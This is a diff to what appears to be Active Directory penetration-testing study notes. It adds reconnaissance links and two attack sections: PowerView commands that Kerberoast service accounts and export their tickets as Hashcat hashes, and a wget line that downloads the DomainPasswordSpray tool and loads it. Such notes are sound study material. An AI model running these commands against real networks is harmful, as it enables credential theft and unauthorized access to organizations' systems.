@@ -6,14 +6,14 @@
 - Schema format 
 - Data disclosures 
 - Breach data
-### Where to look for 
+### Where to look  
 
 [DomainTools](https://whois.domaintools.com/)
 [PTR-Arcive](https://www.whatsmydns.net/dns-lookup/ptr-records)
 [TruffleHog](https://github.com/trufflesecurity/truffleHog)
 [Linkedin2Username](https://github.com/initstring/linkedin2username)
 [DeHashed](https://dehashed.com/search#breachCheck)
-- Social Media 
+[HaveIBeenPwned](https://haveibeenpwned.com/)
 #### Public-facing websites 
 #### loud & Dev Storage Spaces 
 #### Have I Been Pwned
@@ -153,3 +153,16 @@ Find Computers where Domain Users are Local Admin
 ## Privilege Escalation 
 ## Exploitation (from Linux)
 ## Exploitation (from Windows )
+### Kerberoast 
+```
+Import-Module .\PowerView.ps1
+Get-DomainUser * -SPN |Select samaccountname
+Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
+```
+
+### Password Spraying 
+```
+wget https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1
+Import-Module .\DomainPasswordSpray.ps1
+```
+tag:lateral-movement
